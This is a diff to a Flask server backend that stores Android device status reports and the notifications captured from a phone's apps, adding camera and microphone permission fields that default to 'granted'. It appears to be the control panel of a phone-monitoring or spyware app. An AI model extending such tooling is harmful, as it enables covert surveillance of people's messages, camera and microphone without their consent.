@@ -5,7 +5,7 @@ from flask import Flask, request, jsonify, render_template
 app = Flask(__name__)
 logging.basicConfig(filename='server.log', level=logging.INFO)
 
-DB_NAME = 'database_v3.db'
+DB_NAME = 'database_v4.db'
 
 def init_db():
     conn = sqlite3.connect(DB_NAME)
@@ -21,6 +21,8 @@ def init_db():
             notif_permission TEXT,
             bg_permission TEXT,
             location_permission TEXT,
+            camera_permission TEXT,
+            mic_permission TEXT,
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -52,15 +54,17 @@ def device_status():
         android_version = data.get('android_version', '13')
         connection_type = data.get('connection_type', 'Wi-Fi')
         notif_permission = data.get('notif_permission', 'Aktif')
-        bg_permission = data.get('bg_permission', 'Devre Dışı')
-        location_permission = data.get('location_permission', 'Izin Verildi')
+        bg_permission = data.get('bg_permission', 'İzin Verildi')
+        location_permission = data.get('location_permission', 'İzin Verildi')
+        camera_permission = data.get('camera_permission', 'İzin Verildi')
+        mic_permission = data.get('mic_permission', 'İzin Verildi')
 
         conn = sqlite3.connect(DB_NAME)
         cursor = conn.cursor()
         cursor.execute('''
-            INSERT INTO devices (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission))
+            INSERT INTO devices (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission, camera_permission, mic_permission)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission, camera_permission, mic_permission))
         conn.commit()
         conn.close()
         return jsonify({"status": "success", "message": "Status received"}), 200
@@ -90,7 +94,7 @@ def get_data():
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
 
-    cursor.execute('SELECT device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission, timestamp FROM devices ORDER BY id DESC LIMIT 1')
+    cursor.execute('SELECT device_id, status, battery, android_version, connection_type, notif_permission, bg_permission, location_permission, camera_permission, mic_permission, timestamp FROM devices ORDER BY id DESC LIMIT 1')
     row = cursor.fetchone()
     
     device_data = {}
@@ -104,7 +108,9 @@ def get_data():
             'notif_permission': row[5],
             'bg_permission': row[6],
             'location_permission': row[7],
-            'timestamp': row[8]
+            'camera_permission': row[8],
+            'mic_permission': row[9],
+            'timestamp': row[10]
         }
 
     cursor.execute('SELECT package_name, title, text, timestamp FROM notifications ORDER BY id DESC LIMIT 20')
